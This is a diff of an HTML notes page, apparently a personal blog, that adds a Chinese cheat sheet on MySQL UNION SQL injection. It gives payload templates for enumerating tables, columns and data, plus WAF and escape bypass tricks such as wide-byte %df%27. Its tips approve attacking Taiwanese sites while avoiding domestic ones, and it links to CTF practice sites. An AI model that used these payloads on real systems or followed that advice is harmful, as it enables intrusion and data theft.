@@ -3,17 +3,15 @@
 <head>
 <meta charset="UTF-8"> 
 
-<link rel="Stylesheet" href="CSS/WZC1.css" type="text/css"/>
+<link rel="Stylesheet" href="ZT.css" type="text/css"/>
+<link rel="Stylesheet" href="BKd1.css" type="text/css"/>
 <link rel="Stylesheet" href="CSS/wzbkxq.css" type="text/css"/>
 
-
-</head>
 <style type="text/css">
-@font-face{font-family:index;
-    src:url("Cute Font.ttf");
-}
+  ::-moz-selection{background:hotpink; color:snow;}   
 </style>
 
+</head>
 
 <body 
 
@@ -23,12 +21,76 @@
     background-attachment: fixed;" 
 >
 
-<div class="wzc1">
-    <div class='p'>
-        <div style="font-family:index;margin-top:-140px;color:PaleVioletRed;font-size:1000%;text-align:center;">Nothing here</div>
-    </div>
+<div class="p">
+  <div class="zt1">
+    <div>SQL-联合注入</div>
+  </div>
 </div>
 
+<div class='bkd1'>
+    <div style="color: seashell;font-size: 1.3em;">
+      <div class="p">
+    <div style="text-align: center;font-size: 2em;">基础流程</div>
+    <br>
+    <div>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp主体:合理利用mysql-union联合查询语句</div>
+    <div>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp①判断web交互方式(get/post)&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp②判断闭合方式&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp③判断列数&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp④查找可显字段</div>
+    <div>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp⑤构造各种查询语句&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp⑥和过滤/WAF战斗&nbsp&nbsp&nbsp⑦拿到敏感信息&nbsp&nbsp&nbsp&nbsp⑧扫描后台</div>
+    <div style="text-align: center;">······</div>
+    <div style="text-decoration: line-through;text-align: center;">⑨getshell删库跑路</div>
+    <br>
+    <div style="text-align: center;font-size: 2em;">语句模版</div>
+    </div>
+    <ul style="font-size: 0.63em;">
+      <li>判断列数:······/php?id=1' order by 999-- -(建议先用1与999观察页面区别，使用二分法快速拿到列数)</li>
+      <br>
+      <li>判断可显字段:······/php?id=1' and 1=2 order by 6-- -(假设已经查找到6列)</li>
+      <br>
+      <li>查当前数据:······/php?id=1' and 1=2 union select 1,database(),user(),version(),5,6-- -(假设可显字段位为2,3,4)</li>
+      <br>
+      <li>查tables:······/php?id=1' and 1=2 union select 1,2,group_concat(table_name),4 from information_schema.tables where table_schema='database()'-- -</li>
+      <br>
+      <li>查columns:······/php?id=1' and 1=2 union select 1,2,group_concat(column_name),4 from information_schema.columns where table_name='xxx'-- -</li>
+      <br>
+      <li>查内容:······/php?id=1' and 1=2 union select 1,2,xxxx,4 from database().table()-- -(注意后面的database与table要正确,xxxx为column名)</li>
+    </ul>
+    <div class="p">
+    <div style="text-align: center;font-size: 2em;">过滤绕过</div>
+    <ol style="font-size: 0.9em;">
+      <li>注释符: -- -&nbsp&nbsp&nbsp&nbsp--+&nbsp&nbsp&nbsp&nbsp#&nbsp&nbsp&nbsp&nbsp%23&nbsp&nbsp&nbsp&nbsp/**/</li>
+      <li>关键字: 大小写混写(UnIOn)&nbsp&nbsp&nbsp&nbsp分割(uni&lt>on)(uni/**/on)&nbsp&nbsp&nbsp&nbsp双写绕过(SELselectECT)&nbsp&nbsp&nbsp&nbsp编码绕过</li>
+      <li>函数:group_concat-->concat_ws()~~user()-->@@user~~sleep()-->benchmark()~~ascii()-->hex()bin()</li>
+      <li>转义:例如单引号 ' 被转义为 \' (php?id=1'-->id=1%df%27......)(%5c为\,用%5c将\过滤-->...%5c%5c%27...)</li>
+    </ol>
+    <div>&nbsp&nbsp&nbsp&nbsp过滤绕过的一些姿势<a href="https://www.cnblogs.com/Vinson404/p/7253255.html" style="text-decoration:none;color:PaleVioletRed" target="_blank"> ① </a>
+      <a href="https://blog.csdn.net/weixin_40950781/article/details/100061268" style="text-decoration:none;color:PaleVioletRed" target="_blank">② </a>
+      <a href="https://www.cnblogs.com/xishaonian/p/6274586.html" style="text-decoration:none;color:PaleVioletRed" target="_blank">③ </a>
+      <a href="https://blog.csdn.net/weixin_44300286/article/details/96597167" style="text-decoration:none;color:PaleVioletRed" target="_blank">④ </a>
+      <a href="https://blog.csdn.net/huanghelouzi/article/details/82995313" style="text-decoration:none;color:PaleVioletRed" target="_blank">⑤ </a>
+      (点击跳转)虽然我很菜，但我可以当大佬的腿部挂件
+    </div>
+    <br>
+    <div style="text-align: center;font-size: 2em;">实战经验</div>
+    <ul style="font-size: 0.9em;">
+      <li>不要尝试渗透国内网站(湾湾除外)，不要用sqlmap扫zf网站</li>
+      <li>SQL注入尝试顺序建议 联合>报错>盲注</li>
+      <li>敏感table(admin),column(user.pass)</li>
+      <li>有可能数据库里面无管理员敏感信息</li>
+      <li>password有可能是明文也有可能是md5值</li>
+      <li>md5值大概率无法查询到</li>
+      <li>网站后台有可能无法扫描到</li>
+      <li>就算是拿到了管理员账号密码后台网址也有可能无法登录</li>
+      <li>就算是成功登录后台有可能网页无可继续渗透的点位(如无文件上传点)</li>
+    </ul>
+    <div style="text-align: center;font-size: 2em;">CTF练习</div>
+      <div style="text-align: center;"><a href="https://ctf.bugku.com/challenges" style="text-decoration:none;color:PaleVioletRed" target="_blank">BUGKU</a></div>
+      <div style="text-align: center;"><a href="https://www.ctfhub.com/#/index" style="text-decoration:none;color:PaleVioletRed" target="_blank">CTFHUB</a></div>
+      <div style="text-align: center;"><a href="https://buuoj.cn/login?next=%2Fchallenges%3F" style="text-decoration:none;color:PaleVioletRed" target="_blank">BUUCTF</a></div>
+      <div style="text-align: center;"><a href="https://www.cnblogs.com/-chenxs/p/11740485.html" style="text-decoration:none;color:PaleVioletRed" target="_blank">Other</a></div>
+      <br>
+      <div style="text-align: center;color: palevioletred;font-size: 2.5em;">IT IS A LONG WAY TO LEARN</div>
+      </div>
+    </div>
+</div>
 
 <script src="https://cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script>
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css"/>
